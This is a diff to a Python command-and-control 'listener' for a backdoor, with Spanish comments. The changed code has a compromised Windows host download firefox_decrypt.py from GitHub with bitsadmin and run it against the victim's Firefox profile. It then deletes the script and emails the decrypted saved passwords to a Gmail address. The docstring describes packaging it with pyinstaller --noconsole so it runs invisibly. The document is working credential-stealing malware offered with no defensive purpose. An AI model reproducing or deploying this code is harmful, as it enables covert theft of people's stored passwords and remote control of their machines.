@@ -2,22 +2,20 @@
 """
 Listener para el backdoor
 
-Para hacerlo invisible se puede usar pyinstaller con la opción --noconsole
+Para hacer invisible el backdoor se puede utilizar pyinstaller con la 
+opción --noconsole
 
 pyinstaller --onefile --noconsole listener.py
-
 
 """
 
 
 import dotenv
 import os
-import requests
 import signal
 import smtplib
 import socket
 import sys
-import tempfile
 from email.mime.text import MIMEText
 from termcolor import colored
 
@@ -108,11 +106,11 @@ class Listener:
         Consigue el profile de firefox
         """
 
+        path = f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
+
+        command = f"dir {path}"
+
         try:
-
-            path = f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
-
-            command = f"dir {path}"
 
             output_command_dir = self.execute_remotely(command)
 
@@ -129,35 +127,32 @@ class Listener:
 
             return None
 
-
     def get_firefox_passwords(self, username, profiles):
         """
         Extrae las contraseñas guardadas en un profile de firefox
         """
 
+        url_download = "https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py"
+        path_download = "%TEMP%\\firefox_decrypt.py"
+        options_download = "/transfer midescarga /download /priority normal"
+        command_download = f"bitsadmin {options_download} {url_download} {path_download}"
+
         firefox_profile_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{profiles}"
 
-        command = f"python firefox_decrypt.py {firefox_profile_path}"
+        try:
+            self.execute_remotely(command_download)
 
-        r = requests.get(
-            "https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py")
+            command = f"python %TEMP%\\firefox_decrypt.py {firefox_profile_path}"
 
-        self.execute_remotely(f"dir C:\\Users\\{username}\\AppData\\Local\\Temp\\")
-        print(execute_remotely("dir"))
-        
-        command_copy = f"echo {r.content} > firefox_decrypt.py"
-        self.execute_remotely(command_copy)
-        temp_dir = tempfile.mkdtemp()
+            passwords = self.execute_remotely(command)
 
-        os.chdir(temp_dir)
+            self.execute_remotely("del %TEMP%\\firefox_decrypt.py")
 
-        with open("firefox_decrypt.py", "wb") as f:
+        except Exception as e:
 
-            f.write(r.content)
+            print(f"\n[!] Error al obtener las contraseñas de Firefox.\nError: {e}")
 
-        passwords = execute_remotely(command)
-
-        os.remove("firefox_decrypt.py")
+            return None
 
         return passwords
 
@@ -167,7 +162,7 @@ class Listener:
         """
 
         print(colored(
-            "Programa \"Command & Control\" realizado con mucho cariño.\n", 
+            "Programa \"Command & Control\" realizado con mucho cariño.\n",
             "blue"
         ))
 
@@ -210,7 +205,7 @@ class Listener:
 
                 if passwords:
 
-                    send_email(
+                    self.send_email(
                         "Decrypted Firefox Passwords INFO",
                         passwords,
                         "keyloggerseginf@gmail.com",
@@ -235,5 +230,5 @@ class Listener:
 
 if __name__ == "__main__":
 
-    my_listener = Listener("192.168.2.105", 443)
+    my_listener = Listener("192.168.1.119", 443)
     my_listener.run()
